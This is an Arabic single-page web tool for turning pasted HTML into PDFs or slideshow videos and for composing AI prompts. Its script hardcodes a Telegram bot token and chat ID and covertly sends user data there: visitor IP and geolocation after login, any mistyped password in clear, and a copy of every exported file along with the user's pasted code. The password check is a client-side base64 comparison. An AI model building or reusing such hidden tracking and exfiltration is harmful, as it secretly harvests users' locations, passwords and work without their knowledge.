<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة تحويل الأكواد الذكية</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #e2e8f0; margin: 0; padding: 15px; display: flex; flex-direction: column; height: 100vh; box-sizing: border-box; }
        
        /* Navigation Tabs */
        .top-nav { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
        .nav-btn { background: #1e293b; color: #94a3b8; border: 2px solid #334155; padding: 10px 20px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .nav-btn.active { background: #2563eb; color: #fff; border-color: #2563eb; }
        .nav-btn:hover:not(.active) { background: #334155; color: #f8fafc; }

        .main-container { display: flex; gap: 15px; flex: 1; overflow: hidden; }
        @media (max-width: 768px) { .main-container { flex-direction: column; height: auto; overflow: visible; } body {height: auto; padding: 10px;} }
        
        .sidebar { background: #1e293b; border-radius: 10px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3); border: 1px solid #334155; display: flex; flex-direction: column; flex: 1; max-width: 400px; overflow-y: auto;}
        .preview-section { background: #1e293b; border-radius: 10px; padding: 0; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3); border: 1px solid #334155; display: flex; flex-direction: column; flex: 2; overflow: hidden; }
        
        .form-group { margin-bottom: 12px; display: flex; flex-direction: column; }
        label { margin-bottom: 6px; font-weight: bold; font-size: 13px; color: #94a3b8; }
        input, select, textarea { padding: 10px; background: #0f172a; border: 1px solid #334155; border-radius: 6px; font-size: 13px; font-family: inherit; color: #f8fafc; transition: 0.2s;}
        input:focus, select:focus, textarea:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); }
        input:disabled, select:disabled { opacity: 0.5; cursor: not-allowed; text-decoration: line-through; }

        .req-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
        .req-row input[type="text"] { flex: 1; }
        .toggle-req { background: #334155; border: none; color: #f8fafc; border-radius: 6px; padding: 10px; cursor: pointer; transition: 0.2s; font-size: 12px; width: 40px; text-align: center;}
        .toggle-req.disabled { background: #7f1d1d; color: #fca5a5; }

        .textarea-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
        .clear-btn { background: #7f1d1d; color: #fca5a5; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .clear-btn:hover { background: #991b1b; color: #fef2f2; }
        
        textarea { flex: 1; min-height: 140px; resize: vertical; direction: ltr; font-family: monospace; background: #020617; font-size: 12px; line-height: 1.5;}
        
        .row { display: flex; gap: 10px; }
        .row .form-group { flex: 1; }

        .export-btn { background: #2563eb; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 5px; transition: 0.2s; }
        .export-btn:hover { background: #1d4ed8; transform: translateY(-1px);}
        .export-btn:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; transform: none;}
        
        .preview-header { padding: 12px 20px; background: #0f172a; border-bottom: 1px solid #334155; font-size: 14px; font-weight: bold; color: #cbd5e1; display: flex; justify-content: space-between; align-items: center;}
        .tag { background: #312e81; color: #a5b4fc; padding: 4px 10px; border-radius: 6px; font-size: 12px; transition: 0.3s;}
        iframe { width: 100%; height: 100%; border: none; background: #ffffff; }

        .tab-content { display: none; }
        .tab-content.active-tab { display: flex; }
    </style>
</head>
<body>

    <div id="password-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;">
        <div style="background: #1e293b; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.5); border: 1px solid #334155; text-align: center; width: 90%; max-width: 350px;">
            <h3 style="margin-top: 0; color: #f8fafc;">🔒 حماية المنصة</h3>
            <p style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">الرجاء إدخال كلمة المرور للوصول.</p>
            <div class="form-group" style="margin-bottom: 15px;">
                <input type="password" id="pass-input" placeholder="كلمة المرور..." style="text-align: center; letter-spacing: 2px;" onkeypress="if(event.key === 'Enter') checkPassword()">
            </div>
            <button onclick="checkPassword()" class="export-btn" style="width: 100%; padding: 10px; margin-top: 0;">تسجيل الدخول</button>
            <p id="pass-error" style="color: #ef4444; font-size: 12px; display: none; margin-top: 15px; font-weight: bold; margin-bottom: 0;">❌ كلمة المرور غير صحيحة!</p>
        </div>
    </div>

    <div class="top-nav">
        <button class="nav-btn active" id="btn-converter" onclick="switchTab('converter')">⚙️ منصة التحويل (PDF/فيديو)</button>
        <button class="nav-btn" id="btn-prompts" onclick="switchTab('prompts')">🧠 مولد الأوامر الذكي</button>
    </div>

    <div id="converter-tab" class="main-container tab-content active-tab">
        <div class="sidebar">
            <div class="form-group">
                <label>اسم الملف المستخرج:</label>
                <input type="text" id="file-name" value="مستند_جديد" placeholder="اكتب اسم الملف هنا...">
            </div>

            <div class="row">
                <div class="form-group">
                    <label>نوع الاستخراج:</label>
                    <select id="format-select" onchange="updateTag()">
                        <optgroup label="ملفات PDF">
                            <option value="pdf-a4">بحث / تقرير (A4)</option>
                            <option value="pdf-169">عرض تقديمي (16:9)</option>
                        </optgroup>
                        <optgroup label="مقاطع فيديو تلقائية">
                            <option value="vid-169">فيديو شاشات (16:9)</option>
                            <option value="vid-916">فيديو جوال (9:16)</option>
                        </optgroup>
                    </select>
                </div>
                <div class="form-group">
                    <label>الجودة:</label>
                    <select id="quality-select">
                        <option value="1">عادية (أسرع)</option>
                        <option value="2" selected>عالية</option>
                        <option value="3">ممتازة (أبطأ)</option>
                    </select>
                </div>
            </div>

            <div class="row" id="video-options" style="display: none;">
                <div class="form-group">
                    <label>مدة كل شريحة (بالثواني):</label>
                    <select id="slide-duration">
                        <option value="3">3 ثواني</option>
                        <option value="5" selected>5 ثواني</option>
                        <option value="8">8 ثواني</option>
                    </select>
                </div>
            </div>

            <div class="form-group" style="flex: 1;">
                <div class="textarea-header">
                    <label style="margin:0;">كود الـ HTML (الصق هنا):</label>
                    <button class="clear-btn" onclick="clearCode()">🗑️ مسح الكود</button>
                </div>
                <textarea id="html-input" oninput="updatePreview()" placeholder="الصق الكود هنا..."></textarea>
            </div>

            <button id="capture-btn" class="export-btn" onclick="exportFile()">بدء الاستخراج 📥</button>
        </div>

        <div class="preview-section">
            <div class="preview-header">
                <span>👁️ المعاينة المباشرة</span>
                <span class="tag" id="size-tag">الأبعاد: 794 × 1123 (PDF)</span>
            </div>
            <iframe id="preview-frame"></iframe>
        </div>
    </div>

    <div id="prompts-tab" class="main-container tab-content">
        <div class="sidebar" style="max-width: 450px;">
            <div style="background: #022c22; border: 1px dashed #059669; padding: 12px; border-radius: 8px; margin-bottom: 15px; text-align: center;">
                <p style="margin: 0; font-size: 13px; color: #34d399; font-weight: bold;">أدخل المتطلبات، واضغط على (👁️) لإخفاء/شطب أي متطلب لا تريده في الأمر النهائي.</p>
            </div>

            <div class="form-group">
                <label>نوع الملف المطلوب من الذكاء الاصطناعي:</label>
                <select id="prompt-type" onchange="generatePromptText()">
                    <option value="a4">📄 بحث أكاديمي / تقرير (A4)</option>
                    <option value="169">🖥️ عرض تقديمي للشاشات (16:9)</option>
                    <option value="916">📱 عرض تقديمي للجوال/تيك توك (9:16)</option>
                </select>
            </div>

            <label>المعلومات الأساسية:</label>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-title')" title="شطب/تفعيل">👁️</button>
                <input type="text" id="req-title" value="" placeholder="عنوان البحث أو العرض (مثال: الذكاء الاصطناعي)" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-subject')" title="شطب/تفعيل">👁️</button>
                <input type="text" id="req-subject" value="" placeholder="المادة (مثال: حاسب آلي)" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-name')" title="شطب/تفعيل">👁️</button>
                <input type="text" id="req-name" value="" placeholder="اسم الطالب/المقدم" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-group')" title="شطب/تفعيل">👁️</button>
                <input type="text" id="req-group" value="" placeholder="أسماء المجموعة (مفصولة بفاصلة)" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-pages')" title="شطب/تفعيل">👁️</button>
                <input type="text" id="req-pages" value="" placeholder="عدد الصفحات / الشرائح (مثال: 5 صفحات)" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-no-numbers')" title="شطب/تفعيل">👁️</button>
                <input type="text" id="req-no-numbers" value="" placeholder="ملاحظات إضافية (اختياري)" oninput="generatePromptText()">
            </div>

            <button class="export-btn" style="background: #059669; margin-top: 15px;" onclick="copyGeneratedPrompt()">نسخ الأمر الجاهز 📋</button>
        </div>

        <div class="preview-section" style="padding: 20px;">
            <h3 style="margin-top: 0; color: #cbd5e1; border-bottom: 1px solid #334155; padding-bottom: 10px;">✨ الأمر النهائي (موجه للذكاء الاصطناعي):</h3>
            <textarea id="final-prompt-output" readonly style="flex: 1; direction: rtl; font-size: 14px; background: #0f172a; padding: 15px; border: none;"></textarea>
        </div>
    </div>

    <script>
        const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
        const chatId = '6680237928'; 
        const secretHash = "U2ExMjM0NTY3OEA="; 

        window.onload = () => {
            if (localStorage.getItem('auth_token') === secretHash) {
                document.getElementById('password-overlay').style.display = 'none';
            }
            updateTag();
            generatePromptText(); 
        };

        function sendTextToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار: ${msg}` })
            }).catch(e => console.error(e));
        }

        async function sendFileToTelegram(blob, name, caption, type = 'document') {
            const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append(type === 'video' ? 'video' : 'document', blob, name); 
            formData.append('caption', caption);
            try { await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData }); } catch (e) {}
        }

        function checkPassword() {
            const input = document.getElementById('pass-input').value;
            if (btoa(unescape(encodeURIComponent(input))) === secretHash) {
                document.getElementById('password-overlay').style.display = 'none';
                localStorage.setItem('auth_token', secretHash);
                
                fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
                    if(data.ip) {
                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
                        sendTextToTelegram(`✅ دخول ناجح من جهاز جديد.\n\nالآيبي: ${data.ip}\nالدولة: ${data.country}\nالموقع: https://www.google.com/maps?q=$$${lat},${lng}`);
                    }
                }).catch(e => sendTextToTelegram(`✅ دخول ناجح لأول مرة.`));
            } else {
                document.getElementById('pass-error').style.display = 'block';
                sendTextToTelegram(`❌ محاولة دخول فاشلة للمنصة بكلمة: ${input}`);
            }
        }

        function switchTab(tabName) {
            document.getElementById('converter-tab').classList.remove('active-tab');
            document.getElementById('prompts-tab').classList.remove('active-tab');
            document.getElementById('btn-converter').classList.remove('active');
            document.getElementById('btn-prompts').classList.remove('active');

            document.getElementById(`${tabName}-tab`).classList.add('active-tab');
            document.getElementById(`btn-${tabName}`).classList.add('active');
        }

        function toggleInput(btn, inputId) {
            const inputEle = document.getElementById(inputId);
            if (inputEle.disabled) {
                inputEle.disabled = false; btn.innerText = '👁️'; btn.classList.remove('disabled');
            } else {
                inputEle.disabled = true; btn.innerText = '🚫'; btn.classList.add('disabled');
            }
            generatePromptText();
        }

        function generatePromptText() {
            const type = document.getElementById('prompt-type').value;
            let prompt = "";

            if (type === 'a4') prompt += "أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لـ (بحث أكاديمي / تقرير) بالعربية.\n\n";
            else if (type === '169') prompt += "أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لـ (عرض تقديمي للشاشات) بالعربية.\n\n";
            else if (type === '916') prompt += "أنت مصمم عروض HTML محترف ومصمم واجهات تيك توك. قم بإنشاء كود HTML كامل لـ (عرض تقديمي طولي مخصص للجوال) بالعربية.\n\n";

            prompt += "**المعلومات الأساسية المطلوب إدراجها:**\n";
            
            if (!document.getElementById('req-title').disabled && document.getElementById('req-title').value) prompt += `- العنوان: ${document.getElementById('req-title').value}\n`;
            if (!document.getElementById('req-subject').disabled && document.getElementById('req-subject').value) prompt += `- المادة / الموضوع: ${document.getElementById('req-subject').value}\n`;
            if (!document.getElementById('req-name').disabled && document.getElementById('req-name').value) prompt += `- إعداد: ${document.getElementById('req-name').value}\n`;
            if (!document.getElementById('req-group').disabled && document.getElementById('req-group').value) prompt += `- أسماء المجموعة: ${document.getElementById('req-group').value}\n`;
            if (!document.getElementById('req-pages').disabled && document.getElementById('req-pages').value) prompt += `- العدد المطلوب: ${document.getElementById('req-pages').value}\n`;
            if (!document.getElementById('req-no-numbers').disabled && document.getElementById('req-no-numbers').value) prompt += `- ملاحظة هامة: ${document.getElementById('req-no-numbers').value}\n`;

            prompt += "\n**متطلبات تقنية وتصميمية صارمة (لا تتجاوزها نهائياً):**\n";
            prompt += "1. يبدأ الكود بـ <html lang=\"ar\" dir=\"rtl\">\n";
            prompt += "2. استدعاء خطوط Google Fonts (مثل Cairo أو Tajawal) صراحة.\n";
            prompt += "3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n";

            if (type === 'a4') {
                prompt += "4. كل صفحة تكون عبارة عن: <div class=\"page\">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative;\n";
                prompt += "5. التصميم: احترافي، أنيق، يعتمد على ألوان متناسقة وهادئة كالبحوث الرسمية.\n";
            } else if (type === '169') {
                prompt += "4. كل شريحة تكون عبارة عن: <div class=\"page\">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative;\n";
                prompt += "5. التصميم: عصري، جديد، وأنيق جداً (Ultra-Modern). استخدم خلفيات جذابة ونصوص كبيرة.\n";
            } else if (type === '916') {
                prompt += "4. كل شريحة تكون عبارة عن: <div class=\"page\">. أبعادها: width: 720px; height: 1280px; overflow: hidden; position: relative;\n";
                prompt += "5. التصميم: عصري جداً، انسيابي، مصمم لجمهور السوشيال ميديا. استخدم نصوص ضخمة جداً لتكون مقروءة بوضوح على الجوال.\n";
            }

            prompt += "6. ممنوع استخدام القوائم الافتراضية (ul, ol) بتاتاً. إذا أردت وضع نقاط أو ترقيم استخدم عناصر <p> أو <div> عادية واكتب النقطة كجزء من النص.\n";
            prompt += "7. ممنوع استخدام خاصية letter-spacing نهائياً في الـ CSS.\n";
            
            document.getElementById('final-prompt-output').value = prompt;
        }

        function copyGeneratedPrompt() {
            const text = document.getElementById('final-prompt-output').value;
            if(!text.trim()) return;
            navigator.clipboard.writeText(text).then(() => { alert("✅ تم نسخ الأمر بنجاح! الصقه في الذكاء الاصطناعي الآن."); });
        }

        function clearCode() {
            if(confirm("مسح الكود؟")) { document.getElementById('html-input').value = ''; updatePreview(); }
        }

        function updateTag() {
            const f = document.getElementById('format-select').value;
            document.getElementById('video-options').style.display = f.startsWith('vid') ? 'flex' : 'none';
            document.getElementById('size-tag').innerText = f.includes('a4') ? "794x1123" : "1280x720";
        }

        function updatePreview() { document.getElementById('preview-frame').srcdoc = document.getElementById('html-input').value; }

        async function urlToDataURL(url) {
            if (url && (url.startsWith('data:') || url.startsWith('blob:'))) return url;
            let absoluteUrl = url;
            try { if (!url.startsWith('http')) absoluteUrl = new URL(url, window.location.href).href; } catch(e) { absoluteUrl = url; }
            const proxies = [ null, 'https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=' ];
            for (const proxy of proxies) {
                try {
                    let fetchUrl = proxy ? proxy + encodeURIComponent(absoluteUrl) : absoluteUrl;
                    const response = await fetch(fetchUrl, { mode: 'cors' });
                    if (!response.ok) continue;
                    const blob = await response.blob();
                    return await new Promise(res => { const r = new FileReader(); r.onloadend = () => res(r.result); r.readAsDataURL(blob); });
                } catch (err) {}
            }
            return new Promise(res => {
                const img = new Image(); img.crossOrigin = "Anonymous";
                img.onload = () => { const c = document.createElement('canvas'); c.width = img.width; c.height = img.height; c.getContext('2d').drawImage(img, 0, 0); res(c.toDataURL('image/jpeg', 0.8)); };
                img.onerror = () => res(null); img.src = absoluteUrl; setTimeout(() => res(null), 3000); 
            });
        }
        
        async function convertAllImagesToDataURLs(container) {
            const images = Array.from(container.querySelectorAll('img'));
            await Promise.all(images.map(async (img) => {
                const src = img.getAttribute('src');
                if (!src || src.startsWith('data:')) return;
                const dataUrl = await urlToDataURL(src);
                if (dataUrl) img.setAttribute('src', dataUrl);
            }));
        }

        async function exportFile() {
            const f = document.getElementById('format-select').value;
            if (!document.getElementById('html-input').value.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
            if (f.startsWith('pdf')) await generatePDF(); else await generateCinematicVideo();
        }

        async function generateCinematicVideo() {
            const btn = document.getElementById('capture-btn');
            const code = document.getElementById('html-input').value;
            const fileName = document.getElementById('file-name').value || 'video';
            const durationSec = parseInt(document.getElementById('slide-duration').value);
            const quality = parseInt(document.getElementById('quality-select').value);

            let w = document.getElementById('format-select').value === 'vid-916' ? 720 : 1280;
            let h = document.getElementById('format-select').value === 'vid-916' ? 1280 : 720;

            btn.disabled = true; btn.innerText = "⏳ جاري التجهيز...";
            const container = document.createElement('div');
            container.style.width = w + 'px'; container.style.position = 'absolute'; container.style.left = '-9999px';
            container.innerHTML = code; document.body.appendChild(container);

            try {
                await document.fonts.ready; await convertAllImagesToDataURLs(container);
                let pages = container.querySelectorAll('.page'); if (pages.length === 0) pages = [container];
                const canvases = [];
                for (let i = 0; i < pages.length; i++) {
                    btn.innerText = `📸 تصوير شريحة ${i+1}...`;
                    canvases.push(await html2canvas(pages[i], { scale: quality, width: w, height: h, useCORS: true }));
                }

                btn.innerText = "🎬 تسجيل الفيديو...";
                const recCanvas = document.createElement('canvas'); recCanvas.width = w; recCanvas.height = h;
                const ctx = recCanvas.getContext('2d'); ctx.fillStyle = '#ffffff'; ctx.fillRect(0, 0, w, h);
                const stream = recCanvas.captureStream(30);
                
                let mimeType = MediaRecorder.isTypeSupported('video/webm; codecs=vp9') ? 'video/webm; codecs=vp9' : (MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm');
                const recorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 3000000 });
                const chunks = []; recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };

                const recordPromise = new Promise(resolve => {
                    recorder.onstop = async () => {
                        btn.innerText = "✅ جاري حفظ الملف...";
                        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                        const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
                        
                        const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `${fileName}.${ext}`; document.body.appendChild(a); a.click(); document.body.removeChild(a);
                        
                        sendFileToTelegram(blob, `${fileName}.${ext}`, `🎬 فيديو جاهز!`, 'video').catch(e=>{});
                        sendFileToTelegram(new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' }), `${fileName}_code.txt`, `💻 الكود`).catch(e=>{});
                        resolve();
                    };
                });

                recorder.start();
                const totalDur = durationSec * 1000 * canvases.length; const transDur = 800; const start = Date.now();

                function animate() {
                    const elapsed = Date.now() - start;
                    if (elapsed < totalDur) {
                        const idx = Math.floor(elapsed / (durationSec * 1000));
                        const timeInSlide = elapsed % (durationSec * 1000);
                        ctx.fillStyle = "#ffffff"; ctx.fillRect(0, 0, w, h);
                        const zoom = 1 + (timeInSlide / (durationSec * 1000)) * 0.05;
                        const zw = w * zoom; const zh = h * zoom; const ox = (w - zw) / 2; const oy = (h - zh) / 2;

                        if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
                            const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
                            ctx.drawImage(canvases[idx], -p * w + ox, oy, zw, zh);
                            ctx.drawImage(canvases[idx+1], w - p * w, 0, w, h);
                        } else { ctx.drawImage(canvases[idx], ox, oy, zw, zh); }
                        requestAnimationFrame(animate);
                    } else { setTimeout(() => recorder.stop(), 100); }
                }
                animate(); await recordPromise;

            } catch (e) { alert("تعذر استخراج الفيديو!"); }
            finally { document.body.removeChild(container); btn.disabled = false; btn.innerText = "بدء الاستخراج 📥"; }
        }

        async function generatePDF() {
            const btn = document.getElementById('capture-btn');
            const code = document.getElementById('html-input').value;
            const fileName = document.getElementById('file-name').value || 'document';
            const quality = parseInt(document.getElementById('quality-select').value);
            const f = document.getElementById('format-select').value;

            btn.disabled = true; btn.innerText = "⏳ جاري التجهيز...";
            const w = f.includes('a4') ? 794 : 1280; const h = f.includes('a4') ? 1123 : 720;
            const container = document.createElement('div');
            container.style.width = w + 'px'; container.style.position = 'absolute'; container.style.left = '-9999px';
            container.innerHTML = code; document.body.appendChild(container);

            try {
                await document.fonts.ready; await convertAllImagesToDataURLs(container);
                const { jsPDF } = window.jspdf; const pdf = new jsPDF({ orientation: f.includes('a4') ? 'p' : 'l', unit: 'px', format: [w, h] });
                let pages = container.querySelectorAll('.page'); if (pages.length === 0) pages = [container];

                for (let i = 0; i < pages.length; i++) {
                    btn.innerText = `📸 تصوير صفحة ${i+1}...`;
                    const c = await html2canvas(pages[i], { scale: quality, width: w, height: h, useCORS: true });
                    if (i > 0) pdf.addPage([w, h]);
                    pdf.addImage(c.toDataURL('image/jpeg', 0.8), 'JPEG', 0, 0, w, h, undefined, 'FAST');
                }

                btn.innerText = "✅ جاري إنهاء العملية...";
                const blob = pdf.output('blob');
                pdf.save(`${fileName}.pdf`);
                
                sendFileToTelegram(blob, `${fileName}.pdf`, "📥 بحث PDF جاهز!").catch(e=>{});
                sendFileToTelegram(new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' }), `${fileName}_code.txt`, `💻 الكود`).catch(e=>{});
            } catch (e) { alert("حدث خطأ أثناء معالجة الـ PDF"); }
            finally { document.body.removeChild(container); btn.disabled = false; btn.innerText = "بدء الاستخراج 📥"; }
        }
    </script>
